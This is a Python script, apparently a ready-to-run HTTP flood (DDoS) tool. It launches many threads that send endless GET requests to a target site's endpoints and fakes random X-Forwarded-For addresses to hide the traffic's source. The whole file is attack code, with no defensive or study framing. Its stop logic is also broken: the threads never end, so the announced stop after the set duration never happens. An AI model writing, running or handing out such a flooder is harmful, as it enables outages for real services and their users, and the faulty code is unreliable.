import requests
import threading
import random
import time

# Default number of threads to use for the attack
threads_count = 100

# Function to send random GET requests
def send_request(endpoint, callback=print):
    while True:
        try:
            # Generate a random IP to simulate different visitors
            ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "X-Forwarded-For": ip
            }
            # Send the GET request to the endpoint
            response = requests.get(endpoint, headers=headers)
            callback(f"Request sent to {endpoint} with IP {ip}, status: {response.status_code}")
        except Exception as e:
            callback(f"Error sending request to {endpoint}: {e}")
        time.sleep(random.uniform(0.1, 1))  # Random pause between requests

# Function to start the threads with a timeout duration
def start_ddos(url, endpoints, threads_count=threads_count, duration=60, callback=print):
    threads = []
    start_time = time.time()

    # Start the threads
    for i in range(threads_count):
        endpoint = random.choice(endpoints)  # Choose a random endpoint
        thread = threading.Thread(target=send_request, args=(url + endpoint,))
        threads.append(thread)
        thread.start()

    # Run for the specified duration
    while time.time() - start_time < duration:
        pass

    # Stop the attack after the duration has passed
    callback("Attack duration completed. Stopping threads.")
    for thread in threads:
        thread.join()  # Ensure threads complete their execution
